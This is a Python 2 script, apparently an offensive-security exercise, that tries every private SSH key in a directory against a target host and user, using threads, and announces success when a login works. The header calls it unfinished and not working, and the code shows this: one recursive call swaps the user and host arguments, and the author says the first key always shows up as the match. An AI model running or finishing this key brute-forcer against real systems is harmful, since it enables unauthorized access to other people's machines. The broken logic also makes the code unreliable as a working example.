# test_weak_SSH_keys.py
#
#	Des:	IMPORTANT NOTE This script will be postponed indefinitely. Mac OSX 
#			has the strange property of requiring all keys in ~/.ssh along with
#			their corresponding public key. This is extremely irksome and makes
#			this script a bit more of a chore to write. For not it is hardly
#			functional, but may work on other Unix builds (I haven't tested).
#
#			Please view this link if what I said above didn't make sense:
#			http://apple.stackexchange.com/questions/18458/password-dialog-appears-when-ssh-private-key-permissions-are-set-to-0600
#
#	Issues:	1) Needs more testing
#			2) Script is NOT working. The first key is always the answer...
#
#	Notes:	-
#
#	Status:	Heaping-pile-of-crap
#
#	LU: 01/15/16


import argparse
import pexpect
import os
from threading import *

## Global Constants
DEBUG_MODE = False
MAX_CONNECTIONS = 5
MAX_FAILS = 5
##

## Global variables
Connection_lock = BoundedSemaphore(value = MAX_CONNECTIONS)
Fails = 0
Stop = False
##

# --------------------------------------------------------------------------- #
# Function for connecting to the remote host and handling errors
def connect(host, user, keyfile, release):
	global Stop
	global Fails
	global DEBUG_MODE
	
	try:
		perm_denied = "Permission denied"
		new_sshkey = "Are you sure you want to continue"
		host_closed = "Connection closed by remote host"
		host_refused = "ssh: connect to host " +str(host)+ " port 22: Connection refused"
		options = " -o PasswordAuthentication=no"

		command_str = "ssh " + user + "@" + host + " -i " + keyfile + options
		child = pexpect.spawn(command_str)

		expected_return = child.expect([pexpect.TIMEOUT, perm_denied, new_sshkey, host_closed, host_refused, '#', '$',])

		# Handle return values from pexpect child process
		if DEBUG_MODE:
			print "[DEBUG] command_str: " + str(command_str)
			print "[DEBUG] expected_return == " + str(expected_return)
			if expected_return == 0:
				print "[DEBUG] Connection timed out"
			elif expected_return == 1:
				print "[DEBUG] Permission denied"

		if expected_return == 2:
			print "[+] Adding host to ~/.ssh/known_hosts"
			child.sendline('yes')
			connect(user, host, keyfile, False)

		elif expected_return == 3:
			print "[-] Connection closed by remote host"
			Fails += 1

		elif expected_return == 4:
			print "[-] Connection refused by host"
			Fails += 1

		elif expected_return > 4:
			print "[+] Success. We're in! Key: " + str(keyfile)
			Stop = True

	# In case we're using threads
	finally:
		if release:
			Connection_lock.release()

# --------------------------------------------------------------------------- #
# Parse the user inputs from terminal and give back an informational error
# if user misused the script.
def parseInputs():
	global DEBUG_MODE

	parser = argparse.ArgumentParser(description="This tool is INCOMPLETE. It is still being worked. Please do NOT use it unless you're developer")

	parser.add_argument('-H', dest="tgtHost", type=str, \
		help="Specify target host")
	parser.add_argument('-u', dest="remoteUser", type=str, \
		help="Specify username of target machine. You need to know this.")
	parser.add_argument('-d', dest="keyDirectory", type=str, \
		help="Specify directory where private SSH keys are stored")
	parser.add_argument('-D', dest="debugMode", action="store_true", \
		help="Gives debug information on terminal")
	parser.add_argument('-t', dest="useThreads", action="store_true",\
		help="Utilize multithreading. Speeds up process.")

	leOptions = parser.parse_args()

	if (leOptions.tgtHost == None) | (leOptions.remoteUser == None) | (leOptions.keyDirectory == None):
		parser.print_help()
		exit(0)

	else:
		if leOptions.debugMode:
			DEBUG_MODE = True
			print "[+] Debug mode is ON!"

		iterate_thru_keys(leOptions.tgtHost, leOptions.remoteUser, leOptions.keyDirectory, leOptions.useThreads)

# --------------------------------------------------------------------------- #
# If parseInputs() ran successfully, the script will begin to iterate through
# all the SSH keys and then call connect() to test connection.
def iterate_thru_keys(tgtHost, remoteUser, keyDirectory, useThreads=False):
	global MAX_FAILS
	global Stop
	global Fails

	for SSH_key_filename in os.listdir(keyDirectory):
		if Stop:
			print "[+] Exiting: Correct key found!"
			exit(0)
		if Fails > MAX_FAILS:
			print "[-] Exiting: Too many connections closed by remote host."
			print "[*] May need to adjust number of simultaneous threads."
			exit(0)

		if useThreads:
			Connection_lock.acquire()
			fullpath = os.path.join(keyDirectory, SSH_key_filename)
			print "[*] Testing keyfile " + str(fullpath)
			t = Thread(target=connect, args=(tgtHost, remoteUser, fullpath, True))
			child = t.start()
		else:
			fullpath = os.path.join(keyDirectory, SSH_key_filename)
			print "[*] Testing keyfile " + str(fullpath)
			connect(tgtHost, remoteUser, fullpath, False)

	

# --------------------------------------------------------------------------- #
def main():
	parseInputs()
	print "~Fin"


if __name__ == "__main__":
	main()